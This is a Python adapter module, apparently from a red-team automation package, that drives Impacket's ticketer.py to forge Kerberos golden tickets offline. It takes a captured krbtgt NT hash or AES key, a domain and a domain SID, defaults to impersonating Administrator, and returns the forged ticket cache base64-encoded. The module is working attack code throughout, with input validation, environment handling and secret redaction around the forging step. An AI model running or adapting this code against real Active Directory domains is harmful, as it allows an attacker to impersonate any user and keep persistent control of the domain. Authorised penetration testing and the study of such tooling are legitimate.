"""
Subprocess execution for ticketer: drives the real Impacket `ticketer.py`
CLI to forge a Kerberos golden ticket entirely offline, from a captured
krbtgt hash/key -- no network round-trip, no KDC contact.

No parsing logic here -- see parse.py. Every input check happens before
any subprocess runs, and bad input or a genuine execution failure returns
a RawTicketerResult with `error` set rather than raising.

Confirmed real flags against the installed `ticketer.py -h` on CT 115
(Impacket v0.13.1):
  positional target   username the forged ticket authenticates as (NOT a
                       network host -- confirmed from -h: "username for
                       the newly created ticket"). This tool has no
                       network target at all, matching its scope_param
                       of `domain`, not `target`.
  -domain DOMAIN / -domain-sid DOMAIN_SID   required.
  -nthash NTHASH       NT hash (golden ticket's usual recipe).
  -aesKey hex key      AES key, 128 or 256 bits (per its own -h text) --
                       used instead of -nthash for an AES-keyed ticket.
  No -spn (that would make a silver ticket instead of a golden one --
    out of scope here) and no -request/-user/-password/-hashes/-dc-ip
    (those are only for cloning a real ticket from the KDC, which this
    tool never does -- confirmed from -h: that whole "authentication"
    block is documented as "if -request is chosen").

Non-obvious behavior confirmed directly from the installed source
(saveTicket() in ticketer.py): if KRB5CCNAME is already set in the
process environment and points to an existing readable file, ticketer.py
*loads and merges into that ccache* instead of creating a fresh one.
KRB5CCNAME is explicitly cleared from the subprocess env here so every
call starts from a guaranteed-empty ccache, regardless of what the
parent environment happens to have set.

The forged ticket is written to <username-with-/-replaced-by-.>.ccache
in the process's current working directory (confirmed: there is no
-outputfile-style flag at all), so this adapter runs the subprocess with
cwd set to a disposable TemporaryDirectory and reads that exact filename
back out of it (see parse.ccache_filename()).
"""
from __future__ import annotations

import base64
import os
import shutil
import subprocess
import tempfile
from typing import List, Optional

from tradecraft.adapters.ticketer.parse import (
    RawTicketerResult,
    ccache_filename,
    validate_domain,
    validate_domain_sid,
    validate_krbtgt_hash,
    validate_username,
)

TIMEOUT_SECONDS = 60
TICKETER_BIN = "ticketer.py"
DEFAULT_USERNAME = "Administrator"


def find_ticketer_binary() -> Optional[str]:
    return shutil.which(TICKETER_BIN)


def build_argv(
    domain: str,
    domain_sid: str,
    krbtgt_hash: str,
    hash_type: str,
    username: str,
    binary: str = TICKETER_BIN,
) -> List[str]:
    """Builds argv for one offline golden-ticket forge. Assumes inputs
    already passed validation (see execute())."""
    clean_hash = krbtgt_hash.strip()
    argv = [binary, "-domain", domain.strip(), "-domain-sid", domain_sid.strip()]
    if hash_type == "ntlm":
        argv.extend(["-nthash", clean_hash])
    else:
        argv.extend(["-aesKey", clean_hash])
    argv.append(username)
    return argv


def execute(
    domain: str,
    krbtgt_hash: str,
    domain_sid: str,
    hash_type: str = "ntlm",
    username: str = "",
    timeout: Optional[int] = None,
) -> RawTicketerResult:
    """Forges one golden ticket for `username` (default Administrator)
    in `domain`, entirely offline."""
    clean_domain = (domain or "").strip()
    clean_username = (username or "").strip() or DEFAULT_USERNAME

    domain_error = validate_domain(clean_domain)
    if domain_error:
        return RawTicketerResult(domain=clean_domain, username=clean_username, error=domain_error)

    domain_sid_error = validate_domain_sid(domain_sid)
    if domain_sid_error:
        return RawTicketerResult(domain=clean_domain, username=clean_username, error=domain_sid_error)

    hash_error = validate_krbtgt_hash(krbtgt_hash, hash_type)
    if hash_error:
        return RawTicketerResult(domain=clean_domain, username=clean_username, error=hash_error)

    username_error = validate_username(username)
    if username_error:
        return RawTicketerResult(domain=clean_domain, username=clean_username, error=username_error)

    binary = find_ticketer_binary()
    if binary is None:
        return RawTicketerResult(
            domain=clean_domain, username=clean_username,
            error="ticketer.py executable not found on PATH",
        )

    effective_timeout = timeout if timeout is not None else TIMEOUT_SECONDS

    argv = build_argv(
        domain=clean_domain,
        domain_sid=domain_sid,
        krbtgt_hash=krbtgt_hash,
        hash_type=hash_type,
        username=clean_username,
        binary=binary,
    )

    env = dict(os.environ)
    env.pop("KRB5CCNAME", None)

    with tempfile.TemporaryDirectory(prefix="ticketer_") as workdir:
        try:
            proc = subprocess.run(
                argv,
                stdin=subprocess.DEVNULL,
                capture_output=True,
                text=True,
                timeout=effective_timeout,
                cwd=workdir,
                env=env,
            )
        except FileNotFoundError:
            return RawTicketerResult(
                domain=clean_domain, username=clean_username,
                error="ticketer.py executable not found on PATH",
            )
        except subprocess.TimeoutExpired:
            return RawTicketerResult(
                domain=clean_domain, username=clean_username,
                error=f"ticketer.py timed out after {effective_timeout}s",
            )

        secrets = [krbtgt_hash.strip()] if krbtgt_hash else []
        stdout = _redact(proc.stdout or "", secrets)
        stderr = _redact(proc.stderr or "", secrets)

        if proc.returncode != 0:
            tail = _tail(f"{stderr}\n{stdout}")
            return RawTicketerResult(
                domain=clean_domain, username=clean_username,
                stdout=stdout, stderr=stderr, returncode=proc.returncode,
                error=f"ticketer.py failed: {tail}" if tail else "ticketer.py failed",
            )

        ccache_path = os.path.join(workdir, ccache_filename(clean_username))
        if not os.path.isfile(ccache_path):
            return RawTicketerResult(
                domain=clean_domain, username=clean_username,
                stdout=stdout, stderr=stderr, returncode=proc.returncode,
                error="ticketer.py exited successfully but produced no ccache file",
            )

        with open(ccache_path, "rb") as handle:
            ccache_bytes = handle.read()

    return RawTicketerResult(
        domain=clean_domain,
        username=clean_username,
        stdout=stdout,
        stderr=stderr,
        returncode=proc.returncode,
        ccache_b64=base64.b64encode(ccache_bytes).decode("ascii"),
    )


def _redact(text: str, secrets: List[str]) -> str:
    if not text:
        return text
    for secret in sorted({s for s in secrets if s}, key=len, reverse=True):
        text = text.replace(secret, "<redacted>")
    return text


def _tail(text: str) -> str:
    lines = [line.strip() for line in (text or "").splitlines() if line.strip()]
    return lines[-1][:500] if lines else ""
